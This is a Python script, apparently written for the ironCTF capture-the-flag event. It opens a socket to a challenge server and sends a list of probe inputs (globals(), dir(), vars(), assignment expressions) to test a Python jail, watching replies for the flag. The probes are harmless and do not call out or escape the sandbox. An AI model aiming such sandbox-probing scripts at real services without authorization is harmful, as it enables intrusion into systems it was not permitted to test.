import socket
import sys
import time

class PyjailExploit:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
    
    def connect(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            print(f"[+] Connected to {self.host}:{self.port}")
            # Receive initial banner
            self.receive()
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            sys.exit(1)
    
    def send(self, payload):
        try:
            self.sock.send(payload.encode() + b'\n')
            print(f"[>] Sent payload: {payload}")
        except Exception as e:
            print(f"[-] Send failed: {e}")
    
    def receive(self):
        try:
            data = self.sock.recv(1024).decode().strip()
            print(f"[<] Received: {data}")
            return data
        except Exception as e:
            print(f"[-] Receive failed: {e}")
            return None
    
    def close(self):
        if self.sock:
            self.sock.close()
            print("[+] Connection closed")
    
    def test_payload(self, payload):
        print(f"\n[*] Testing payload: {payload}")
        self.send(payload)
        return self.receive()

def main():
    # Challenge connection details
    HOST = "misc.1nf1n1ty.team"
    PORT = 30010
    
    # List of payloads to test
    payloads = [
        "globals()",
        "locals()",
        "vars()",
        "dir()",
        "REDACTED",
        "(1)",
        "E=1;E",
        "(S:=1)",
        "S=1;S",
        "(Y:=1)",
        "Y=1;Y",
    ]
    
    # Create exploit instance
    exploit = PyjailExploit(HOST, PORT)
    
    try:
        # Connect to server
        exploit.connect()
        
        # Test each payload
        for payload in payloads:
            result = exploit.test_payload(payload)
            # Add a small delay between attempts to avoid overwhelming the server
            time.sleep(0.5)
            
            # Optional: Add specific success condition checks here
            if "ironCTF{" in str(result):
                print(f"[!] Potential flag found in response!")
                break
                
    finally:
        # Ensure connection is closed properly
        exploit.close()

if __name__ == "__main__":
    main()
